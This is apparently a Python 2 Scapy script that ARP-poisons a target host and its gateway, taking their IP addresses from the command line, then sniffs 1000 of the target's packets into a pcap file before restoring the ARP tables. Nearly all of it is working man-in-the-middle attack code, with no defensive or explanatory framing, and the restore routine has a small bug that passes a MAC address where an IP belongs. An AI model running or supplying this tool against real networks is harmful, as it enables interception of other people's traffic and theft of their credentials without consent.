import sys
import threading

import time

import os

import signal
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, sniff, wrpcap, sr, send
from scapy.sendrecv import srp

interface = "en0"
target_ip = sys.argv[2]
gateway_ip = sys.argv[1]
packet_count = 1000

#Configure Scapy
#Set interface
conf.iface = interface
#Disable Verbose Mode
conf.verb = 0

#Get Mac address of the corresponding host
def get_mac(ip_address):
    #srp sends and receives
    #srp returns packets and associated answer in the first arg
    #srp returns unanswered packets
    response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=100, retry=1000)

    for s,r in response:
        #print s, r[ARP].hwsrc
        return r[Ether].src

    return None # in case of argument IP address is not found

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    #Send ARP request using scapy
    poison_target = ARP()
    poison_target.op = 2 #is for is_at
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2 #is for is_at
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "STARTING ARP POISONING"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print "ARP POISONING ENDED"
    return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "RESTORING ARP Configuration"
    send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff"))
    send(ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"))

    #Stop the main thread
    os.kill(os.getpid(), signal.SIGINT)


#MAIN

print "Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

#if gateway_mac is None:
#    print "<!> Failed to get gateway MAC Address"
#    sys.exit(0)
#else:
#    print "Gateway MAC Address is %s" % gateway_mac

print "Target ip is %s" % target_ip
target_mac = get_mac(target_ip)
#target_mac = sr(ARP(op=ARP.who_has, psrc="192.168.1.12", pdst=target_ip))
if target_mac is None:
    print "<!> Failed to get Target MAC Address"
    sys.exit(0)
else:
    print "Target MAC Address is %s" % target_mac

#Start poisoning
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff connection
try:
    print "Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)



